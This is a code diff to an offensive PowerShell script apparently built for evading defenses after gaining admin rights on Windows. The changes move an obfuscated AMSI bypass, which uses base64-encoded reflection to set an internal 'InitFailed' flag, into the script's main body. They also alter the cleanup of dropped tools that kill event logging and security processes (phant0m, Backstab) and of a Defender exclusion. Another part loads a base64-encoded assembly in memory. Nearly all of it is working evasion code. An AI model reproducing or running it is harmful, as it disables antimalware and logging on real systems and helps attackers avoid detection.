@@ -1,14 +1,3 @@
-function Invoke-BravoSix() {
-    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-        Write-Warning "You must be an Administrator to run this script."
-        return
-    }
-
-    $t = [Ref].Assembly.GetTypes() | foreach {if ($_.Name -like "*iUtils") {$u=$_}}
-    Invoke-Expression ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("JABmAHMAIAA9ACAAJAB1AC4ARwBlAHQARgBpAGUAbABkAHMAKAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApACAAfAAgAGYAbwByAGUAYQBjAGgAIAB7AGkAZgAgACgAJABfAC4ATgBhAG0AZQAgAC0AbABpAGsAZQAgACIAKgBJAG4AaQB0AEYAYQBpAGwAZQBkACIAKQAgAHsAJABmAD0AJABfAH0AfQA=")))
-    $f.SetValue($null,$true)
-}
-
 function GoingDark() {
     $goingdark = "X19fICBfX19fIF9fX18gXyAgXyBfX19fICAgIF9fX18gXyBfICBfICAgICAgX19fXyBfX19fIF8gXyAgXyBfX19fICAgIF9fXyAgX19fXyBfX19fIF8gIF8gDQp8X19dIHxfXy8gfF9ffCB8ICB8IHwgIHwgICAgW19fICB8ICBcLyAgICAgICB8IF9fIHwgIHwgfCB8XCB8IHwgX18gICAgfCAgXCB8X198IHxfXy8gfF8vICANCnxfX10gfCAgXCB8ICB8ICBcLyAgfF9ffCAgICBfX19dIHwgXy9cXyAuICAgIHxfX10gfF9ffCB8IHwgXHwgfF9fXSAgICB8X18vIHwgIHwgfCAgXCB8IFxfIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICcgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA="
     Write-Host([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($goingdark)))
@@ -83,8 +72,13 @@ function BravoCleanup() {
 
     # cleaning up downloadables
     $downloadDirectory = "C:\Windows\Temp"
-    Remove-Item -Path $downloadDirectory\phant0m-exe.exe -Force | Out-Null
-    Remove-Item -Path $downloadDirectory\Backstab.exe -Force | Out-Null
+
+    if (Test-Path $downloadDirectory\phant0m-exe.exe) {
+        Remove-Item -Path $downloadDirectory\phant0m-exe.exe -Force 
+    }
+    if (Test-Path $downloadDirectory\Backstab.exe) {
+        Remove-Item -Path $downloadDirectory\Backstab.exe -Force
+    }
     Remove-MpPreference -ExclusionPath "C:\Windows\Temp"
 }
 
@@ -94,4 +88,12 @@ function TrustedInstaller() {
     [System.Reflection.Assembly]::Load([Convert]::FromBase64String($trustedInstaller)) | Out-Null
 }
 
-Invoke-BravoSix
+# main
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    Write-Warning "You must be an Administrator to run this script."
+    return
+}
+
+$t = [Ref].Assembly.GetTypes() | foreach {if ($_.Name -like "*iUtils") {$u=$_}}
+Invoke-Expression ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("JABmAHMAIAA9ACAAJAB1AC4ARwBlAHQARgBpAGUAbABkAHMAKAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApACAAfAAgAGYAbwByAGUAYQBjAGgAIAB7AGkAZgAgACgAJABfAC4ATgBhAG0AZQAgAC0AbABpAGsAZQAgACIAKgBJAG4AaQB0AEYAYQBpAGwAZQBkACIAKQAgAHsAJABmAD0AJABfAH0AfQA=")))
+$f.SetValue($null,$true)
